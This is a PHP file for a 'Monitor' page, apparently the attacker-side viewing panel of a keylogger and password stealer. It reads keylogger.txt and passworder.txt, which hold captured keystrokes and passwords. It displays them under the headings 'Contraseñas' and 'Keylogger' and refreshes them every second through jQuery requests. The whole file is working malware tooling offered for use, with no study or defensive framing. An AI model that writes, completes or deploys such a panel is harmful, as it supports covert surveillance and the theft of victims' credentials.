<?php
if (isset($_GET['keyloggerdata'])) {
    $homepage = file_get_contents('keylogger.txt');
    echo $homepage;
}
elseif (isset($_GET['passwordsdata'])) {
    $homepage = file_get_contents('passworder.txt');
    $homepage = nl2br($homepage);
    echo $homepage;
} else {
?>
    <!DOCTYPE html>
    <html>

    <head>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"
        integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width">
        <title>Monitor</title>
        <style>
            html,
            body {
                height: 95%;
                background-color: #000;
            }

            .contenedor {
                height: 30%;
                background-color: #6A737C;
                margin: 1% 1%;
                color: lime;
                font-size: 120%;
            }
        </style>
        <script>
            function reloadData() {
                $.get("monitor.php", {
                    keyloggerdata: true
                }, function(data) {
                    $("#klgdata").html("")
                    $("#klgdata").html(data);
                });
                
                $.get("monitor.php", {
                    passwordsdata: true
                }, function(data) {
                    $("#pwdsdata").html("")
                    $("#pwdsdata").html(data);
                });

            }
            setInterval(function(){ reloadData(); }, 1000);
        </script>
    </head>

    <body>
        <h1 style="color:whitesmoke;font-family:candara;text-align:center">Contraseñas:</h1>
        <div class="contenedor">
            <div id="pwdsdata" style="width: 100%;font-size:150%;font-family:verdana">Loading...</div>

        </div>
        <h1 style="color:whitesmoke;font-family:candara;text-align:center">Keylogger:</h1>

        <div class="contenedor">
            <div id="klgdata" style="width: 100%;font-size:150%;font-family:verdana">Loading...</div>
        </div>
    </body>

    </html>
<?php
}
?>